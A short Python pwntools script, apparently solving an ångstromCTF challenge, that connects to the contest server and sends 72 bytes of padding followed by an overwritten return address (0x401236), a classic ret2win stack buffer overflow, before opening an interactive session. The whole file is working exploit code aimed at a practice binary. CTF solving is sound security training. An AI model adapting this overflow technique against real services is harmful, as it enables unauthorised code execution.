#!user/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
io = remote('challs.actf.co', 31300)


# =========================================================
#                         EXPLOITS
# =========================================================

# Got manually through cyclic gdb-pwndbg
padding = 72

payload = flat(
    b'A' * padding,
    p64(0x401236)
)

io.sendlineafter(b'Your input: ', payload)

io.interactive()